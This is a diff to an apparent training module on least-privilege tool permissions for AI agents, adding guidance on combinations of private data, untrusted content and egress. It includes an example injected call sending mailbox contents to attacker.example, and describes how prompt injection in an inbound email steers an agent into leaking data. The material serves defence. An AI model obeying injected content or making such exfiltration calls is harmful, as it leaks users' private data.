@@ -5,7 +5,7 @@ name: Tool permissions & least privilege
 kind: practice
 difficulty: core
 est_minutes: 14
-status: fact-checked
+status: reviewed
 related:
   - agent-reliability/idempotent-tool-execution
   - agent-reliability/audit-logs-execution-traces
@@ -93,6 +93,19 @@ the write-root restriction on `write_file` is decoration. Either sandbox those t
 filesystem, no network, no ambient credentials, CPU and time limits) or treat granting them as granting
 everything.
 
+### Combinations, not just tools
+Reviewing tools one at a time misses the most common real attack, which needs three capabilities in
+the same run: access to private data, exposure to untrusted content, and a channel that can carry data
+out. Each is harmless alone. A run that reads a customer's mailbox (private), processes an inbound email
+(untrusted) and can fetch a URL (egress) can be steered into `http_get("https://attacker.example/?d=<the
+mailbox contents>")`. Exfiltration channels are wider than they look: an image URL in rendered Markdown, a
+link the UI unfurls, a ticket comment visible to an outside party. The control is to make sure no single
+run holds all three: drop egress for runs that read untrusted content, or route untrusted content through
+a quarantined sub-call that has no tools and returns only structured fields. Some runtimes go further and
+narrow the profile dynamically: once untrusted content has entered the context, side-effecting and egress
+tools are removed for the rest of the run, *because* from that point every later decision may be
+attacker-influenced.
+
 ### Measuring blast radius
 A useful mental formula: blast radius of a run ≈ Σ over granted tools of (reach of the credential ×
 irreversibility of the action). Reach is the set of resources the token can touch; irreversibility is
@@ -132,7 +145,7 @@ def check(policy: Policy, name: str, args: dict) -> str:
     if name in ("http_get", "http_post"):
         host = urlparse(args["url"]).hostname or ""
         if not any(fnmatch.fnmatch(host, pat) for pat in policy.egress_allow):
-            return "deny"
+            return "deny"              # the HTTP client must also refuse redirects off the list
     return "ask" if name in policy.needs_approval else "allow"
 
 def execute(policy, name, args, *, user, run_id, approve, vault, tools, audit):
@@ -172,6 +185,10 @@ def execute(policy, name, args, *, user, run_id, approve, vault, tools, audit):
   exhausted on the same denied call.
 - "Read-only" tools that are not: a `search` that writes query history or a `lookup` that triggers a
   webhook; the symptom is side effects in a run that was supposed to have none.
+- Checking the egress allowlist only on the URL the model emitted while the HTTP client follows
+  redirects; the symptom is egress-proxy logs showing requests to hosts that were never on the list.
+- Approving each tool in isolation without asking which combinations a run holds; the symptom is a
+  red-team finding where private data leaves through a harmless-looking fetch or rendered image link.
 
 ## When to use
 Apply it to every tool that can mutate state, spend money, send messages or read non-public data, which in
@@ -205,7 +222,8 @@ delimited, but the design does not depend on the model respecting that. Every qu
 audit log with run id, user and policy version. Proof is a red-team suite: tickets containing injection
 payloads run through the agent in staging, with assertions that the warehouse state is unchanged and that
 the denied statements appear in the audit log. The metric is zero successful forbidden actions, not zero
-attempts.
+attempts. Finally, check the combination: this agent reads untrusted text and private data, so it should
+have no egress tool at all, or the injection could leak orders instead of dropping them.
 
 ## Quiz
 ### Q: Why is "never delete files" in the system prompt not a sufficient control for an agent with a `delete_file` tool?
